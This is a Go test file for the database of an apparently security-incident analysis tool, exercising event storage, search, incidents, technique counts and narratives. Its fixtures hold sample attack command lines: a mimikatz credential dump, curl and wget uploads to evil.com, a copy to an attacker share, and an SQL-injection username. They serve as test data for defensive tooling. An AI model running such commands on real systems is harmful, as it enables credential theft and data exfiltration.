package database

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

// generateTestEvents creates n events spread across hosts, IPs, and types
func generateTestEvents(n int, baseTime time.Time) []Event {
	hosts := []string{"dc01", "dc02", "web01", "web02", "db01", "app01", "file01", "mail01"}
	ips := []string{"10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5", "192.168.1.10", "192.168.1.20"}
	types := []string{"authentication", "process", "network", "file", "registry", "dns", "powershell", "scheduled_task"}
	users := []string{"admin", "jsmith", "svc_account", "backup", "guest", "testuser", "deploy"}
	eventIDs := []string{"4625", "4648", "4672", "4688", "4698", "4663", "4768", "4769", "5156", "4626"}
	commands := []string{
		"net user admin /add",
		"mimikatz.exe sekurlsa::logonpasswords",
		"powershell -enc ABC123",
		"cmd.exe /c whoami",
		"robocopy /mir C:\\data \\\\server\\share",
		"curl -T file.txt http://evil.com/upload",
		"lsass.exe memory dump",
		"kerberos ticket request",
		"xcopy C:\\secrets \\\\attacker\\share",
		"wget --post-file=data.txt http://evil.com",
	}

	events := make([]Event, n)
	for i := 0; i < n; i++ {
		ts := baseTime.Add(time.Duration(i) * time.Minute)
		events[i] = Event{
			UserID:      fmt.Sprintf("user-%d", i%5),
			Timestamp:   ts.Format(time.RFC3339),
			Hostname:    hosts[i%len(hosts)],
			EventType:   types[i%len(types)],
			EventID:     eventIDs[i%len(eventIDs)],
			UserName:    users[i%len(users)],
			SourceIP:    ips[i%len(ips)],
			CommandLine: commands[i%len(commands)],
			ProcessName: fmt.Sprintf("process_%d.exe", i%10),
		}
	}
	return events
}

func TestScale_InsertAndQuery100Events(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	events := generateTestEvents(100, time.Now().Add(-2*time.Hour))
	if err := db.InsertEvents(events); err != nil {
		t.Fatalf("insert failed: %v", err)
	}

	// Verify all events were inserted
	got, total, err := db.GetEvents(200, 0)
	if err != nil {
		t.Fatalf("query failed: %v", err)
	}
	if total != 100 {
		t.Errorf("expected 100, got %d", total)
	}
	if len(got) != 100 {
		t.Errorf("expected 100 events, got %d", len(got))
	}
}

func TestScale_UniqueHostsAndIPs(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	events := generateTestEvents(200, time.Now().Add(-2*time.Hour))
	db.InsertEvents(events)

	stats, err := db.GetStats()
	if err != nil {
		t.Fatalf("failed: %v", err)
	}

	if stats["total_events"] != 200 {
		t.Errorf("expected 200 events, got %v", stats["total_events"])
	}

	// We have 8 unique hosts in generateTestEvents
	if stats["unique_hosts"] != 8 {
		t.Errorf("expected 8 unique hosts, got %v", stats["unique_hosts"])
	}
}

func TestScale_PaginationCorrectness(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	events := generateTestEvents(100, time.Now().Add(-2*time.Hour))
	db.InsertEvents(events)

	// Fetch all events in pages of 20
	var allIDs []int64
	for page := 0; page < 5; page++ {
		got, total, err := db.GetEvents(20, page*20)
		if err != nil {
			t.Fatalf("page %d failed: %v", page, err)
		}
		if total != 100 {
			t.Errorf("page %d: expected total 100, got %d", page, total)
		}
		for _, e := range got {
			allIDs = append(allIDs, e.ID)
		}
	}

	if len(allIDs) != 100 {
		t.Errorf("expected 100 unique IDs across pages, got %d", len(allIDs))
	}

	// Check no duplicates
	seen := make(map[int64]bool)
	for _, id := range allIDs {
		if seen[id] {
			t.Errorf("duplicate event ID %d across pages", id)
		}
		seen[id] = true
	}
}

func TestScale_SearchAcrossEvents(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	events := generateTestEvents(500, time.Now().Add(-2*time.Hour))
	db.InsertEvents(events)

	// Search for "admin" — should match events with UserName="admin"
	results, err := db.SearchEvents("admin")
	if err != nil {
		t.Fatalf("search failed: %v", err)
	}

	// events with UserName="admin" appear at indices 0, 5, 10, ... (every 5th in 0..49)
	// In 500 events, that's 100 events
	if len(results) == 0 {
		t.Error("expected results for 'admin'")
	}

	// Verify all results contain "admin" in some field
	for _, e := range results {
		if e.UserName != "admin" && e.Hostname != "admin" && e.EventType != "admin" {
			// Search is LIKE %admin% — check if it appears somewhere
			found := strings.Contains(strings.ToLower(e.UserName), "admin") ||
				strings.Contains(strings.ToLower(e.Hostname), "admin") ||
				strings.Contains(strings.ToLower(e.EventType), "admin") ||
				strings.Contains(strings.ToLower(e.CommandLine), "admin")
			if !found {
				t.Errorf("event %d doesn't contain 'admin': user=%s host=%s cmd=%s",
					e.ID, e.UserName, e.Hostname, e.CommandLine)
			}
		}
	}
}

func TestScale_UserScopedQueries(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	events := generateTestEvents(200, time.Now().Add(-2*time.Hour))
	db.InsertEvents(events)

	// user-0 has events at indices 0, 5, 10, ... (every 5th)
	got, total, err := db.GetEventsByUserID("user-0", 200, 0)
	if err != nil {
		t.Fatalf("failed: %v", err)
	}

	// 200 events / 5 users = 40 events per user
	if total != 40 {
		t.Errorf("expected 40 events for user-0, got %d", total)
	}
	if len(got) != 40 {
		t.Errorf("expected 40 events in slice, got %d", len(got))
	}

	// Verify all belong to user-0
	for _, e := range got {
		if e.UserID != "user-0" {
			t.Errorf("event %d has user_id '%s', expected 'user-0'", e.ID, e.UserID)
		}
	}
}

func TestScale_IncidentLifecycle(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	// Insert 300 events
	events := generateTestEvents(300, time.Now().Add(-2*time.Hour))
	db.InsertEvents(events)

	// Seed techniques first (foreign key requirement)
	db.SeedTechniques([]TechniqueRef{
		{TechniqueID: "T1110", Name: "Brute Force", Tactic: "credential-access"},
		{TechniqueID: "T1059", Name: "Command and Scripting Interpreter", Tactic: "execution"},
	})

	// Group into incidents: create 10 incidents, each linked to 10 events
	for i := 0; i < 10; i++ {
		inc := &Incident{
			UserID:      fmt.Sprintf("user-%d", i%3),
			Title:       fmt.Sprintf("Incident %d", i),
			Description: fmt.Sprintf("Description for incident %d", i),
			SourceIP:    fmt.Sprintf("10.0.0.%d", (i%5)+1),
			StartTime:   time.Now().Add(-time.Duration(300-i*10) * time.Minute).Format(time.RFC3339),
			EndTime:     time.Now().Add(-time.Duration(300-i*10-5) * time.Minute).Format(time.RFC3339),
			EventCount:  10,
			Severity:    []string{"critical", "high", "medium", "low"}[i%4],
			Status:      "new",
			Techniques: []TechniqueRef{
				{TechniqueID: "T1110", EventCount: 5},
				{TechniqueID: "T1059", EventCount: 3},
			},
		}
		eventIDs := make([]int64, 10)
		for j := 0; j < 10; j++ {
			eventIDs[j] = int64(i*10 + j + 1)
		}
		if err := db.CreateIncident(inc, eventIDs); err != nil {
			t.Fatalf("create incident %d failed: %v", i, err)
		}
	}

	// Verify total incidents
	incs, total, err := db.GetIncidents(100, 0, "", "", "")
	if err != nil {
		t.Fatalf("failed: %v", err)
	}
	if total != 10 {
		t.Errorf("expected 10 incidents, got %d", total)
	}
	if len(incs) != 10 {
		t.Errorf("expected 10 incidents in slice, got %d", len(incs))
	}

	// Verify user scoping
	user0Incs, total, _ := db.GetIncidentsByUserID("user-0", 100, 0, "", "", "")
	if total != 4 { // incidents 0, 3, 6, 9 → user-0
		t.Errorf("expected 4 incidents for user-0, got %d", total)
	}
	if len(user0Incs) != 4 {
		t.Errorf("expected 4 incidents in slice, got %d", len(user0Incs))
	}

	// Verify severity filtering
	criticalIncs, total, _ := db.GetIncidents(100, 0, "critical", "", "")
	if total != 3 { // incidents 0, 4, 8 → critical
		t.Errorf("expected 3 critical incidents, got %d", total)
	}
	if len(criticalIncs) != 3 {
		t.Errorf("expected 3 critical in slice, got %d", len(criticalIncs))
	}
	for _, inc := range criticalIncs {
		if inc.Severity != "critical" {
			t.Errorf("expected critical, got %s", inc.Severity)
		}
	}

	// Verify incident events are linked
	incEvents, err := db.GetIncidentEvents(1)
	if err != nil {
		t.Fatalf("failed: %v", err)
	}
	if len(incEvents) != 10 {
		t.Errorf("expected 10 events for incident 1, got %d", len(incEvents))
	}
}

func TestScale_IncidentStats(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	// Create incidents with various severities and event counts
	severities := []string{"critical", "high", "medium", "low"}
	for i := 0; i < 20; i++ {
		db.CreateIncident(&Incident{
			UserID:     fmt.Sprintf("user-%d", i%3),
			Title:      fmt.Sprintf("Incident %d", i),
			SourceIP:   fmt.Sprintf("10.0.0.%d", (i%5)+1),
			StartTime:  time.Now().Add(-time.Duration(20-i) * time.Minute).Format(time.RFC3339),
			EndTime:    time.Now().Add(-time.Duration(20-i-1) * time.Minute).Format(time.RFC3339),
			EventCount: (i + 1) * 5,
			Severity:   severities[i%4],
			Status:     "new",
		}, nil)
	}

	stats, err := db.GetIncidentStats()
	if err != nil {
		t.Fatalf("failed: %v", err)
	}

	if stats["total_incidents"] != 20 {
		t.Errorf("expected 20 incidents, got %v", stats["total_incidents"])
	}

	bySev := stats["by_severity"].(map[string]int)
	// 20 incidents / 4 severities = 5 each
	for _, sev := range severities {
		if bySev[sev] != 5 {
			t.Errorf("expected 5 %s incidents, got %d", sev, bySev[sev])
		}
	}

	avgEvents := stats["avg_events_per_incident"].(float64)
	if avgEvents == 0 {
		t.Error("expected non-zero avg events")
	}
}

func TestScale_TechniqueCounts(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	db.SeedTechniques([]TechniqueRef{
		{TechniqueID: "T1110", Name: "Brute Force", Tactic: "credential-access"},
		{TechniqueID: "T1059", Name: "Command and Scripting Interpreter", Tactic: "execution"},
		{TechniqueID: "T1078", Name: "Valid Accounts", Tactic: "initial-access"},
	})

	// Create 50 incidents with varying technique usage
	for i := 0; i < 50; i++ {
		techs := []TechniqueRef{}
		if i%2 == 0 {
			techs = append(techs, TechniqueRef{TechniqueID: "T1110", EventCount: i % 10})
		}
		if i%3 == 0 {
			techs = append(techs, TechniqueRef{TechniqueID: "T1059", EventCount: i % 5})
		}
		if i%7 == 0 {
			techs = append(techs, TechniqueRef{TechniqueID: "T1078", EventCount: 1})
		}

		db.CreateIncident(&Incident{
			Title:      fmt.Sprintf("Inc %d", i),
			SourceIP:   "10.0.0.1",
			StartTime:  time.Now().Add(-time.Duration(50-i) * time.Minute).Format(time.RFC3339),
			EndTime:    time.Now().Add(-time.Duration(50-i-1) * time.Minute).Format(time.RFC3339),
			Severity:   "medium",
			Status:     "new",
			Techniques: techs,
		}, nil)
	}

	counts, err := db.GetTechniqueCounts()
	if err != nil {
		t.Fatalf("failed: %v", err)
	}

	// T1110: incidents 0,2,4,...,48 → 25 incidents
	if counts["T1110"] != 25 {
		t.Errorf("expected 25 for T1110, got %d", counts["T1110"])
	}

	// T1059: incidents 0,3,6,...,48 → 17 incidents
	if counts["T1059"] != 17 {
		t.Errorf("expected 17 for T1059, got %d", counts["T1059"])
	}

	// T1078: incidents 0,7,14,21,28,35,42,49 → 8 incidents
	if counts["T1078"] != 8 {
		t.Errorf("expected 8 for T1078, got %d", counts["T1078"])
	}
}

func TestScale_NarrativeAndFeedbackLifecycle(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	// Create incident with events
	events := generateTestEvents(50, time.Now().Add(-2*time.Hour))
	db.InsertEvents(events)

	inc := &Incident{UserID: "user-1", Title: "Test Lifecycle", SourceIP: "10.0.0.1", StartTime: time.Now().Add(-time.Hour).Format(time.RFC3339), EndTime: time.Now().Format(time.RFC3339), Severity: "high", Status: "new"}
	db.CreateIncident(inc, []int64{1, 2, 3, 4, 5})

	// Create narrative
	narr := &Narrative{
		IncidentID:       inc.ID,
		UserID:           "user-1",
		Summary:          "This is a test narrative with multiple sentences.",
		Confidence:       0.85,
		Sentences:        `{"sentences":[{"text":"First sentence","timestamp":"2025-12-21T10:00:00Z","source_event_ids":[1,2],"confidence":0.9},{"text":"Second sentence","timestamp":"2025-12-21T10:01:00Z","source_event_ids":[3,4],"confidence":0.85},{"text":"Third sentence","timestamp":"2025-12-21T10:02:00Z","source_event_ids":[5],"confidence":0.8}]}`,
		ModelUsed:        "openai/gpt-4o-mini",
		Temperature:      0.2,
		TokensUsed:       350,
		GenerationTimeMs: 3200,
	}
	if err := db.CreateNarrative(narr); err != nil {
		t.Fatalf("create narrative failed: %v", err)
	}

	// Retrieve by ID
	got, err := db.GetNarrativeByID(narr.ID)
	if err != nil || got == nil {
		t.Fatalf("get narrative failed: %v", err)
	}
	if got.Summary != narr.Summary {
		t.Errorf("summary mismatch: %s != %s", got.Summary, narr.Summary)
	}

	// Retrieve by incident ID
	got2, err := db.GetNarrativeByIncidentID(inc.ID)
	if err != nil || got2 == nil {
		t.Fatalf("get by incident failed: %v", err)
	}

	// Source events
	sourceEvents, err := db.GetNarrativeSourceEvents(narr.ID)
	if err != nil {
		t.Fatalf("get source events failed: %v", err)
	}
	if len(sourceEvents) != 5 {
		t.Errorf("expected 5 source events, got %d", len(sourceEvents))
	}

	// Create feedback
	for i := 0; i < 10; i++ {
		rating := 1
		if i%3 == 0 {
			rating = -1
		}
		fb := &Feedback{
			NarrativeID: narr.ID,
			IncidentID:  inc.ID,
			Rating:      rating,
			Notes:       fmt.Sprintf("Feedback %d", i),
		}
		if err := db.CreateFeedback(fb); err != nil {
			t.Fatalf("create feedback %d failed: %v", i, err)
		}
	}

	feedbacks, err := db.GetFeedbackByIncidentID(inc.ID)
	if err != nil {
		t.Fatalf("get feedback failed: %v", err)
	}
	if len(feedbacks) != 10 {
		t.Errorf("expected 10 feedbacks, got %d", len(feedbacks))
	}
}

func TestScale_UnprocessedEvents(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	// Insert 100 events
	events := generateTestEvents(100, time.Now().Add(-2*time.Hour))
	db.InsertEvents(events)

	// Link events 1-30 to an incident
	inc := &Incident{Title: "Linked", SourceIP: "10.0.0.1", StartTime: time.Now().Add(-time.Hour).Format(time.RFC3339), EndTime: time.Now().Format(time.RFC3339), Severity: "high", Status: "new"}
	eventIDs := make([]int64, 30)
	for i := 0; i < 30; i++ {
		eventIDs[i] = int64(i + 1)
	}
	db.CreateIncident(inc, eventIDs)

	// Unprocessed events should be 70
	unprocessed, err := db.GetUnprocessedEvents()
	if err != nil {
		t.Fatalf("failed: %v", err)
	}
	if len(unprocessed) != 70 {
		t.Errorf("expected 70 unprocessed, got %d", len(unprocessed))
	}
}

func TestScale_EmptyDatabase(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	// All queries should work on empty DB
	events, total, err := db.GetEvents(10, 0)
	if err != nil {
		t.Fatalf("GetEvents failed: %v", err)
	}
	if total != 0 || len(events) != 0 {
		t.Error("expected empty results")
	}

	stats, err := db.GetStats()
	if err != nil {
		t.Fatalf("GetStats failed: %v", err)
	}
	if stats["total_events"] != 0 {
		t.Error("expected 0 events")
	}

	incStats, err := db.GetIncidentStats()
	if err != nil {
		t.Fatalf("GetIncidentStats failed: %v", err)
	}
	if incStats["total_incidents"] != 0 {
		t.Error("expected 0 incidents")
	}

	incs, total, err := db.GetIncidents(10, 0, "", "", "")
	if err != nil {
		t.Fatalf("GetIncidents failed: %v", err)
	}
	if total != 0 || len(incs) != 0 {
		t.Error("expected empty incidents")
	}

	counts, err := db.GetTechniqueCounts()
	if err != nil {
		t.Fatalf("GetTechniqueCounts failed: %v", err)
	}
	if len(counts) != 0 {
		t.Error("expected empty technique counts")
	}
}

func TestScale_LargeSearchQuery(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	// Insert events with unique identifiers
	events := make([]Event, 500)
	for i := 0; i < 500; i++ {
		events[i] = Event{
			Timestamp:   time.Now().Add(-time.Duration(500-i) * time.Minute).Format(time.RFC3339),
			Hostname:    fmt.Sprintf("host-%d", i%20),
			EventType:   "authentication",
			EventID:     "4625",
			UserName:    fmt.Sprintf("user_%d", i),
			SourceIP:    fmt.Sprintf("10.0.%d.%d", i/255, i%255),
			CommandLine: fmt.Sprintf("unique_cmd_%d_xyz", i),
		}
	}
	db.InsertEvents(events)

	// Search for a truly unique command
	results, err := db.SearchEvents("unique_cmd_42_xyz")
	if err != nil {
		t.Fatalf("search failed: %v", err)
	}
	if len(results) != 1 {
		t.Errorf("expected 1 result for unique_cmd_42_xyz, got %d", len(results))
	}

	// Search for a broader term that matches multiple events
	// "authentication" appears in all 500 events (EventType)
	// Use SearchEventsPaginated to get all results (SearchEvents caps at 100)
	results, total, err := db.SearchEventsPaginated("authenti", 1000, 0)
	if err != nil {
		t.Fatalf("search failed: %v", err)
	}
	if total != 500 {
		t.Errorf("expected 500 total for 'authenti', got %d", total)
	}
	if len(results) != 500 {
		t.Errorf("expected 500 results for 'authenti', got %d", len(results))
	}

	// Search for a source IP pattern — 10.0.0. appears in events 0-254
	results, total, err = db.SearchEventsPaginated("10.0.0.", 1000, 0)
	if err != nil {
		t.Fatalf("search failed: %v", err)
	}
	// Events 0-254 have SourceIP 10.0.0.x, events 255-499 have 10.0.1.x
	if total != 255 {
		t.Errorf("expected 255 total for '10.0.0.', got %d", total)
	}
	if len(results) != 255 {
		t.Errorf("expected 255 results for '10.0.0.', got %d", len(results))
	}
}

func TestScale_ConcurrentInserts(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	// Insert events in batches (simulating concurrent ingestion)
	for batch := 0; batch < 5; batch++ {
		events := generateTestEvents(100, time.Now().Add(-time.Duration(500-batch*100)*time.Minute))
		for i := range events {
			events[i].UserID = fmt.Sprintf("batch-%d", batch)
		}
		if err := db.InsertEvents(events); err != nil {
			t.Fatalf("batch %d insert failed: %v", batch, err)
		}
	}

	// Verify total
	_, total, err := db.GetEvents(1000, 0)
	if err != nil {
		t.Fatalf("query failed: %v", err)
	}
	if total != 500 {
		t.Errorf("expected 500 events, got %d", total)
	}

	// Verify each batch is scoped correctly
	for batch := 0; batch < 5; batch++ {
		_, batchTotal, err := db.GetEventsByUserID(fmt.Sprintf("batch-%d", batch), 200, 0)
		if err != nil {
			t.Fatalf("batch %d query failed: %v", batch, err)
		}
		if batchTotal != 100 {
			t.Errorf("batch %d: expected 100 events, got %d", batch, batchTotal)
		}
	}
}

func TestScale_SpecialCharacters(t *testing.T) {
	dbPath := t.TempDir() + "/test.db"
	db, err := New(dbPath)
	if err != nil {
		t.Fatalf("failed to create db: %v", err)
	}
	defer db.Close()

	events := []Event{
		{Timestamp: "2025-12-21T10:00:00Z", Hostname: "dc01", EventType: "auth", SourceIP: "10.0.0.1",
			UserName: "DOMAIN\\administrator", CommandLine: "net user \"John Doe\" /add"},
		{Timestamp: "2025-12-21T10:01:00Z", Hostname: "dc01", EventType: "auth", SourceIP: "10.0.0.1",
			UserName: "admin@company.com", CommandLine: "SELECT * FROM users WHERE name LIKE '%test%'"},
		{Timestamp: "2025-12-21T10:02:00Z", Hostname: "dc01", EventType: "auth", SourceIP: "10.0.0.1",
			UserName: "日本語ユーザー", CommandLine: "echo 'こんにちは世界'"},
		{Timestamp: "2025-12-21T10:03:00Z", Hostname: "dc01", EventType: "auth", SourceIP: "10.0.0.1",
			UserName: "user; DROP TABLE events;--", CommandLine: "C:\\Program Files\\App\\app.exe --config=\"key=value\""},
	}
	if err := db.InsertEvents(events); err != nil {
		t.Fatalf("insert failed: %v", err)
	}

	got, total, err := db.GetEvents(10, 0)
	if err != nil {
		t.Fatalf("query failed: %v", err)
	}
	if total != 4 {
		t.Errorf("expected 4 events, got %d", total)
	}

	// Verify special characters survive round-trip
	for _, e := range got {
		if e.UserName == "DOMAIN\\administrator" {
			// Found the backslash user
			return
		}
	}
	t.Error("special character username not found")
}
